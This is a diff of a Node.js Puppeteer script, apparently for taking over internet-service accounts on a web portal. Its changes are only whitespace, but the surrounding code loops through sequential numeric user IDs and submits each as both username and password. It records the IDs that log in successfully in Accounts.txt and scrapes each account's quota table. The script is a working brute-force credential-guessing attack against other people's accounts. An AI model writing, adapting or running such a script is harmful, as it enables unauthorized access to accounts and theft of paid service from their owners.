@@ -25,7 +25,7 @@ async function findInternet(){
 
 	while (howManyTrys !== 0) {
 
-		await navigateSite(page);
+	await navigateSite(page);
         await fillForm(page);	
         await exitAccount(page);
         await showQuota(page);
@@ -79,7 +79,7 @@ async function fillForm(page){
 
 		howManyTrys -= 1;
 		user += 1;
-        console.log(user);	
+        	console.log(user);	
 
 	    // clear input field
 		async function clear(page, selector) {
@@ -97,14 +97,14 @@ async function fillForm(page){
 		await page.type(userName_InputField, user.toString());
 		await page.type(password_InputField, user.toString());		
 
-        try {
-            await page.waitForSelector(login_Button,{timeout:15000});
-            await page.click(login_Button);
-        } catch (error) {
+		try {
+		    await page.waitForSelector(login_Button,{timeout:15000});
+		    await page.click(login_Button);
+		} catch (error) {
 			console.log("account found!");
-            fs.appendFile(`${__dirname}\\Accounts.txt`, `\n${user}`, err => {})
-            accountFound = true;
-        }
+			fs.appendFile(`${__dirname}\\Accounts.txt`, `\n${user}`, err => {})
+			accountFound = true;
+		}
 	}
 }
 
@@ -122,12 +122,12 @@ async function exitAccount(page){
 async function showQuota(page) {
 
 	await page.waitForSelector(tableContent);
-    var table = await page.evaluate(async() => {
+    	var table = await page.evaluate(async() => {
         let tds = Array.from(document.querySelectorAll("td.alert-link"))
         return tds.map(td => td.innerText)
     });
-    console.log(table);
-    fs.appendFile(`${__dirname}\\Accounts.txt`, `\n${table}`, err => {})
+	console.log(table);
+	fs.appendFile(`${__dirname}\\Accounts.txt`, `\n${table}`, err => {});
 }
 
 findInternet();
